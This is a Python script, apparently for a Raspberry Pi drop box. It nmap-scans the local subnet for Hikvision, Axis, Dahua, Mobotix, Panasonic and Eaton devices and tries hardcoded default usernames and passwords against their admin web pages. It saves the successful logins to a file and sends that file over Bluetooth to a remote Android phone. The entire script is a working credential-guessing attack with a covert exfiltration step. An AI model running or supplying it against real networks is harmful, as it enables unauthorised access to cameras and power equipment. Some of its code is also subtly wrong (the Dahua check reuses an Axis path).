import nmap
import requests
from requests.auth import HTTPBasicAuth
from requests.auth import HTTPDigestAuth
import socket
import sys
import subprocess


# Get current interface ip address
def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]


def network_scan():
    # save print output to text file
    with open('/tmp/output.txt', "w") as sys.stdout:
        # assign interface_ip to get_ip_address return value
        interface_ip = get_ip_address()
        # Convert networkIP to 0/24 subnet ip range
        network_cidr = interface_ip[:interface_ip.rfind('.') + 1] + '0/24'
        # tcp ports to scan for found vendor device
        port_list = '21,22,23,80,81,8080'
        nm = nmap.PortScanner()
        # scan network with specified network_cidr and ports_to_check
        nm.scan(network_cidr, port_list, arguments='-sS', sudo=True)
        for host in nm.all_hosts():
            if 'mac' in nm[host]['addresses']:
                vendor = str(nm[host]['vendor'])[23:][:-2]
                ip = str(nm[host]['addresses'])[10:-30]
                vendor_list = ['Mobotix AG', 'Hangzhou Hikvision Digital Technology', 'Axis Communications AB',
                               'Zhejiang Dahua Technology', 'Panasonic Communications Co', 'Eaton']

                for vendor_string in vendor_list:
                    if vendor_string in vendor:
                        print('----------------------------------------')
                        # print vendor name
                        print(vendor)
                        # print ip address
                        print(ip)
                        # print only open ports
                        for proto in nm[host].all_protocols():
                            ports = nm[host][proto].keys()
                            for port in ports:
                                port_state = nm[host][proto][port]["state"]
                                # only print result for open ports
                                if port_state == 'open':
                                    print(f'port: {port}\tstate: {port_state}')

                        # define http request function
                        def http_request(default_login, default_pw, url_location):
                            auth_methods = [HTTPBasicAuth, HTTPDigestAuth]
                            # try Basic and Digest auth methods, if auth success then print auth_method success
                            for auth_method in auth_methods:
                                try:
                                    response = requests.get(f'http://{ip}{url_location}',
                                                            auth=auth_method(default_login, default_pw),
                                                            verify=False, timeout=2.0)

                                    if response.ok:
                                        print(f'{str(auth_method)[22:][:-2]} success')
                                        break
                                except requests.exceptions.RequestException as e:
                                    pass

                        # call http_request function if device vendor name contains target vendor
                        if vendor_string == 'Mobotix AG':
                            # Mobotix: Default - admin/meinsm
                            http_request('admin', 'meinsm', '/control/userimage.html')

                        if vendor_string == 'Hangzhou Hikvision Digital Technology':
                            # Hikvision: Firmware 5.3.0 and up requires unique password creation; previously admin/12345
                            http_request('admin', '12345', '/ISAPI/System/status')

                        if vendor_string == 'Axis Communications AB':
                            # Axis: Traditionally root/pass, new Axis cameras require password creation during first login
                            http_request('root', 'pass', '/axis-cgi/admin/param.cgi?action=list&group=RemoteService')

                        if vendor_string == 'Zhejiang Dahua Technology':
                            # Dahua: Requires password creation on first login, older models default to admin/admin
                            http_request('admin', 'admin', '/axis-cgi/admin/param.cgi?action=list&group=RemoteService')

                        if vendor_string == 'Panasonic Communications Co':
                            # Panasonic TV default user: dispadmin/@Panasonic
                            http_request('dispadmin', '@Panasonic', '/cgi-bin/main.cgi')

                        if vendor_string == 'Eaton':
                            # Eaton UPS default user: admin/admin
                            http_request('admin', 'admin', '/set_net.htm')

        print('Scanning finished.')


# call function - scan network
network_scan()

# send scan results output file from RPi to remote Android device via Bluetooth
# https://stackoverflow.com/questions/8556777/dbus-php-unable-to-launch-dbus-daemon-without-display-for-x11?rq=1
# A8:7D:12:51:91:37
res = subprocess.Popen('eval \'dbus-launch --auto-syntax\' bt-obex -p MAC_ADDRESS /tmp/output.txt', shell=True,
                       stdout=subprocess.PIPE)
# Wait for the process end and print error in case of failure
if res.wait() != 0:
    output, error = res.communicate()
    print(error)
